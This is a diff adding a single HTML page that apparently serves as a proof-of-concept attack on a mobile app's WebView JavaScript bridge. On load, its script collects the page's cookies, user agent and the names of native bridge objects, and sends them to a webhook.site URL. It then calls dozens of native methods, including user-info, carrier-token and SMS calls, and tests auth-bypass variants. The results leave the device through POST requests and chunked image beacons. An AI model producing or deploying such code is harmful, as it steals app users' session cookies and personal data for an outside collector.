@@ -1,0 +1,31 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>OMP2</title></head><body><h1 id="s">P2</h1>
+<script>
+(function(){
+var T0=Date.now();var RES={};var BASE='https://webhook.site/595eb324-20ef-4e1b-89bf-7496e3c769bf';
+function post(tag,obj){try{fetch(BASE+'/'+tag,{method:'POST',headers:{'Content-Type':'text/plain'},body:JSON.stringify(obj),keepalive:true}).catch(function(){});}catch(e){}}
+function img(tag,s){try{var im=new Image();im.src=BASE+'/g_'+tag+'?d='+encodeURIComponent(s);}catch(e){}}
+function snap(){var N=['JS2NativeBridge','ttwebview','iesJsBridgeTransferMonitor','SDKRuntime','SDKNativeWebApi','secsdk','verifySDK','registToGlobal','useWebSecsdkApi','ToutiaoJSBridge','BDXBridge','__globalProps','JSBridge','Native2JSBridge','hybridMonitor','PIA','webview','AndroidBridge'];var o={};N.forEach(function(n){var v=window[n];var t=typeof v;var m=[];if(v&&(t==='object'||t==='function')){try{m=Object.getOwnPropertyNames(v);}catch(e){m=['ERR']}}o[n]={t:t,m:m}});return o;}
+var ENV={href:location.href,origin:location.origin,ua:navigator.userAgent,t:T0,env:snap(),cookie:document.cookie};
+post('env',ENV);
+window.JSBridge={_handleMessageFromApp:function(m){var o=m;try{if(typeof m==='string')o=JSON.parse(m);}catch(e){o={raw:String(m)}}RES[o&&o.__callback_id]={c:o&&o.__params&&o.__params.code,m:o&&o.__params&&o.__params.msg};}};
+window.Native2JSBridge={_handleMessageFromApp:function(m){post('cb2',{raw:typeof m==='string'?m.slice(0,300):m});}};
+var METHODS=["fqbase.preloadImage", "fqbase.reportAppLog", "fqbase.showToast", "novelfm.SendADLog", "novelfm.appendVideoWorkList", "novelfm.checkDouyinPermission", "novelfm.clearPlayerBallLogParams", "novelfm.getABConfig", "novelfm.getActiveBookList", "novelfm.getDyIMLatestInfo", "novelfm.getExtraInfo", "novelfm.getMusicBlacklist", "novelfm.getNativeTest", "novelfm.getPlayStatus", "novelfm.getPostSeqAbConfig", "novelfm.getRemainingTimeToListen", "novelfm.getUserInfo", "novelfm.isEnableGoldCoinAudioTips", "novelfm.isRecommendEnabled", "novelfm.listenTimeCheckUpperLimit", "novelfm.nonStandardAdTrack", "novelfm.revokeFeedback", "novelfm.sendLoadingFinishTime", "novelfm.sendThirdTrack", "novelfm.setEnableGoldCoinAudioTips", "novelfm.setHeader", "novelfm.setPlayerBallLogParams", "novelfm.setStatusBar", "novelfm.setStayPageParams", "novelfm.setSwipeBackEnabled", "novelfm.setVipRenewPromotionPopupTime", "novelfm.takeOverBackPress", "novelfm.updateDislikeState", "account.fetch", "account.getCarrierPhone", "account.getCarrierToken", "account.getSdkVersion", "account.getVerifyDecision", "account.onUserInfoChanged", "account.sendLog", "account.sendSms", "account.setVerifyStatus", "account.verify", "upc.getApiRecordStatus", "upc.getPrivacyStatus", "upc.getSystemAuthorityStatus", "upc.getTeenMode", "bullet.getVisibleInfo", "bullet.prefetch", "bullet.prefetchV2", "bullet.preload", "bullet.preloadResource", "bullet.setTracert", "bullet.stopRecord", "original.appendVideoWorkList", "original.originUpdateSeries", "original.updateVideoWorkInfo", "ad.preloadVideo", "inspire.preloadRewardVideoAd", "pia.internal.trigger", "pia.rendering.execute", "anniex.preInit", "x.getAppInfo", "x.getUserInfo", "x.getSettings", "x.close", "getSettings", "getAppInfo", "novelfm.__probe_nonexistent__"];
+function send(f,id,extra){var req={func:f,namespace:'',params:{},__msg_type:'JSSDK',__callback_id:id,__timestamp:Date.now(),appID:'3040'};if(extra)for(var k in extra)req[k]=extra[k];try{window.JS2NativeBridge._invokeMethod(JSON.stringify(req));}catch(e){RES[id]={e:String(e)}}}
+var i=0;
+function step(){if(i>=METHODS.length){finish();return;}send(METHODS[i],'m'+i);i++;setTimeout(step,120);}
+function finish(){
+  // extra oracles
+  try{window.JS2NativeBridge.call('novelfm.getUserInfo',JSON.stringify({}));}catch(e){RES['callerr']={e:String(e)}}
+  send('novelfm.getUserInfo','tok1',{__bridgeAuthToken:'probe-token'});
+  send('novelfm.getUserInfo','ifr1',{__iframe_url:'https://fanqienovel.com/'});
+  send('novelfm.getUserInfo','nsx1',{namespace:'x',func:'getAppInfo'});
+  setTimeout(function(){
+    var out={href:location.href,t:Date.now()-T0,n:Object.keys(RES).length,res:RES};
+    var s=JSON.stringify(out);post('final',out);
+    for(var k=0;k<Math.ceil(s.length/1200);k++)img('fin'+k,s.slice(k*1200,(k+1)*1200));
+    document.getElementById('s').textContent='DONE '+out.n;
+  },1500);
+}
+setTimeout(step,300);
+})();
+</script></body></html>
